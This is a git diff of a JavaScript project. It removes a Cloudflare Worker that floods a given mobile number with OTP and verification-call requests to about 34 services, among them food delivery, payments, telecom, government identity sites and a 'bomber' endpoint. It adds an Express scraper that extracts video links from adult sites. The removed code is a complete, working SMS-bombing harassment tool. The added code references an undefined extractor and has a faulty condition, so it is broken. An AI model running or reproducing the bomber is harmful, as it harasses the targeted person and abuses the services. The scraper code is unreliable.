@@ -1,98 +1,162 @@
-export default {
-  async fetch(request) {
-    const { searchParams } = new URL(request.url);
-    const mobile = searchParams.get("mobile");
+const express = require('express');
+const axios = require('axios');
+const cheerio = require('cheerio');
+const cors = require('cors');
+const { URL } = require('url');
 
-    if (!mobile) {
-      return new Response("❌ Missing 'mobile' parameter", { status: 400 });
-    }
+const app = express();
+app.use(cors());
+app.use(express.json());
 
-    // All APIs in parallel for maximum speed
-    const payloads = [
-      // E-Commerce & Food Delivery
-      { url: "https://www.samsung.com/in/api/v1/sso/otp/init", method: "POST", body: { user_id: mobile } },
-      { url: "https://profile.swiggy.com/api/v3/app/request_call_verification", method: "POST", body: { mobile } },
-      { url: `https://bomber-tools.xyz/?mobile=${mobile}&accesskey=bombersmm&submit=Submit`, method: "GET" },
-      { url: "https://www.olx.in/api/auth/authenticate?lang=en-IN", method: "POST", body: { method: "call", phone: `+91${mobile}`, language: "en-IN", grantType: "retry" } },
-      { url: "https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call", method: "POST", body: { contactNumber: mobile, domainId: "2" } },
-      { url: "https://www.meesho.com/api/v1/user/login/request-otp", method: "POST", body: { phone_number: mobile } },
-      
-      // Finance & Payments
-      { url: "https://aa-interface.phonepe.com/apis/aa-interface/users/otp/trigger", method: "POST", body: { rmn: mobile, purpose: "REGISTRATION" } },
-      { url: "https://netbanking.paytmbank.com/api/v1/otp", method: "POST", body: { mobile: `91${mobile}` } },
-      { url: "https://www.phonepe.com/apis/hermes/v1/auth/send_otp", method: "POST", body: { phone: `+91${mobile}` } },
-      
-      // Telecom & ISPs
-      { url: "https://www.jio.com/api/v1/otp/send", method: "POST", body: { mobile: `91${mobile}` } },
-      { url: "https://www.airtel.in/app-api/v1/otp", method: "POST", body: { mobile: `91${mobile}` } },
-      { url: "https://www.bsnl.co.in/api/v1/otp/send", method: "POST", body: { mobile: `91${mobile}` } },
-      { url: "https://www.mtnl.in/api/v1/otp/send", method: "POST", body: { mobile: `91${mobile}` } },
-      
-      // Travel & Ride-Hailing
-      { url: "https://auth.uber.com/v3/oauth/otp", method: "POST", body: { mobile: `+91${mobile}` } },
-      { url: "https://www.makemytrip.com/api/v1/otp/send", method: "POST", body: { phone: `91${mobile}` } },
-      { url: "https://www.goibibo.com/api/v1/auth/otp", method: "POST", body: { phone: `91${mobile}` } },
-      
-      // Social Media & Short Videos
-      { url: "https://api.whatsapp.com/v1/otp/send", method: "POST", body: { phone: `91${mobile}` } },
-      { url: "https://www.sharechat.com/api/v1/otp/send", method: "POST", body: { phone: `91${mobile}` } },
-      { url: "https://www.chingari.io/api/v1/otp/send", method: "POST", body: { phone: `91${mobile}` } },
-      { url: "https://www.mojapp.in/api/v1/otp/send", method: "POST", body: { phone: `91${mobile}` } },
-      
-      // Government & Banking
-      { url: "https://uidai.gov.in/api/v1/otp/send", method: "POST", body: { aadhaar: mobile } },
-      { url: "https://www.digilocker.gov.in/api/v1/otp/send", method: "POST", body: { mobile: `91${mobile}` } },
-      { url: "https://identity.tllms.com/api/request_otp", method: "POST", body: { feature: "", phone: `+91${mobile}`, type: "sms", app_client_id: "null" } },
-      
-      // Others
-      { url: `https://rupaiyaraja.com/9987/src/api/otp.php?num=${mobile}`, method: "GET" },
-      { url: "https://api.countrydelight.in/api/auth/new_request_otp", method: "POST", body: { new_user: true, mobile_no: mobile } },
-      { url: "https://omni-api.moreretail.in/api/v1/login/", method: "POST", body: { hash_key: "XfsoCeXADQA", phone_number: mobile } },
-      { url: "https://api.khatabook.com/v1/auth/request-otp", method: "GET" },
-      { url: "https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin", method: "POST", body: { mobile, otpOperationType: "SignUp" } },
-      { url: "https://api.doubtnut.com/v4/student/login", method: "POST", body: { is_web: "3", phone_number: mobile } },
-      { url: "https://www.my11circle.com/api/fl/auth/v3/getOtp", method: "POST", body: { isPlaycircle: false, mobile, deviceId: "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1", deviceName: "", refCode: "" } },
-      { url: "https://admin.doctime.com.bd/api/otp/send", method: "POST", body: { contact: mobile } },
-      { url: "https://api.eat-z.com/auth/customer/signin", method: "POST", body: { username: mobile } },
-      { url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", method: "POST", body: { organizationId: "5eb393ee95fab7468a79d189", mobile } },
-      { url: "https://www.rummycircle.com/api/fl/auth/v3/getOtp", method: "POST", body: { isPlaycircle: false, mobile, deviceId: "6ebd671c-a5f7-4baa-904b-89d4f898ee79", deviceName: "", refCode: "" } }
-    ];
-
-    // Fire all requests in parallel
-    const results = await Promise.allSettled(
-      payloads.map(api => {
-        const options = {
-          method: api.method,
-          headers: { "Content-Type": "application/json" }
-        };
-        if (api.method === "POST") options.body = JSON.stringify(api.body);
-        return fetch(api.url, options);
-      })
-    );
-
-    // Generate detailed report
-    const summary = results.map((res, i) => ({
-      service: payloads[i].url.split('/')[2].replace('www.', ''),
-      url: payloads[i].url,
-      method: payloads[i].method,
-      status: res.status,
-      success: res.status === "fulfilled" && res.value?.ok,
-      statusCode: res.status === "fulfilled" ? res.value.status : null
-    }));
-
-    // Final response
-    return new Response(JSON.stringify({
-      success: true,
-      mobile,
-      totalRequests: payloads.length,
-      successfulRequests: summary.filter(s => s.success).length,
-      failedRequests: summary.filter(s => !s.success).length,
-      results: summary
-    }, null, 2), {
-      headers: { 
-        "Content-Type": "application/json",
-        "Access-Control-Allow-Origin": "*" 
-      }
-    });
-  }
+// Supported domains and their extraction methods
+const SUPPORTED_DOMAINS = {
+    'maut.com': extractMautLinks,
+    'tubeninja.net': extractTubeninjaLinks,
+    'xhcdn.com': extractXhcdnLinks,
+    'xhamster.com': extractXhamsterLinks,
+    // Add more domains as needed
 };
+
+// Domain-specific extractors
+async function extractMautLinks(url) {
+    const response = await axios.get(url);
+    const html = response.data;
+    const $ = cheerio.load(html);
+    
+    const sources = [];
+    $('script').each((i, el) => {
+        const scriptContent = $(el).html() || '';
+        const regex = /(https?:\/\/[^\s'"]+\.(mp4|m3u8))/g;
+        const matches = scriptContent.match(regex);
+        if (matches) {
+            matches.forEach(match => {
+                sources.push({
+                    url: match,
+                    quality: match.match(/(\d+p)\./)?.[1] || 'unknown'
+                });
+            });
+        }
+    });
+    return sources;
+}
+
+async function extractTubeninjaLinks(url) {
+    const response = await axios.get(url);
+    const html = response.data;
+    const $ = cheerio.load(html);
+    
+    const sources = [];
+    $('a[href*=".mp4"], source[src*=".mp4"]').each((i, el) => {
+        const src = $(el).attr('href') || $(el).attr('src');
+        sources.push({
+            url: src,
+            quality: src.match(/(\d+p)\./)?.[1] || 'unknown'
+        });
+    });
+    return sources;
+}
+
+async function extractXhcdnLinks(url) {
+    // Direct link - just return it with quality
+    return [{
+        url: url,
+        quality: url.match(/(\d+p)\./)?.[1] || 'unknown'
+    }];
+}
+
+async function extractAhcdnLinks(url) {
+    // Direct link - just return it with quality
+    return [{
+        url: url,
+        quality: url.match(/(\d+p)\./)?.[1] || 'unknown'
+    }];
+}
+
+// Main API endpoint
+app.get('/api/get-video', async (req, res) => {
+    try {
+        const { url } = req.query;
+        
+        if (!url) {
+            return res.status(400).json({ error: 'URL parameter is required' });
+        }
+
+        // Parse URL to get domain
+        let domain;
+        try {
+            const parsedUrl = new URL(url);
+            domain = parsedUrl.hostname.replace('www.', '');
+        } catch (e) {
+            return res.status(400).json({ error: 'Invalid URL provided' });
+        }
+
+        // Find appropriate extractor
+        const extractor = SUPPORTED_DOMAINS[domain] || extractGenericLinks;
+        
+        const sources = await extractor(url);
+        
+        if (sources.length === 0) {
+            return res.status(404).json({ error: 'No video sources found' });
+        }
+
+        res.json({
+            originalUrl: url,
+            availableSources: sources
+        });
+    } catch (error) {
+        console.error('API error:', error);
+        res.status(500).json({ error: 'Failed to fetch video sources', details: error.message });
+    }
+});
+
+// Generic extractor as fallback
+async function extractGenericLinks(url) {
+    try {
+        const response = await axios.get(url);
+        const html = response.data;
+        const $ = cheerio.load(html);
+        
+        const sources = [];
+        
+        // Check for direct video tags
+        $('video source').each((i, el) => {
+            const src = $(el).attr('src');
+            if (src && (src.endsWith('.mp4') || src.includes('.m3u8'))) {
+                sources.push({
+                    url: src,
+                    quality: $(el).attr('data-quality') || src.match(/(\d+p)\./)?.[1] || 'unknown'
+                });
+            }
+        });
+        
+        // Check for iframes that might contain videos
+        $('iframe').each((i, el) => {
+            const src = $(el).attr('src');
+            if (src && src.includes('youtube.com') || src.includes('vimeo.com')) {
+                sources.push({
+                    url: src,
+                    quality: 'embedded',
+                    type: 'iframe'
+                });
+            }
+        });
+        
+        return sources;
+    } catch (error) {
+        // If we can't fetch the page, assume it's a direct video link
+        if (url.match(/\.(mp4|m3u8)$/)) {
+            return [{
+                url: url,
+                quality: url.match(/(\d+p)\./)?.[1] || 'unknown'
+            }];
+        }
+        return [];
+    }
+}
+
+// Start server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
+    console.log(`API endpoint: http://localhost:${PORT}/api/get-video?url=YOUR_VIDEO_URL`);
+});
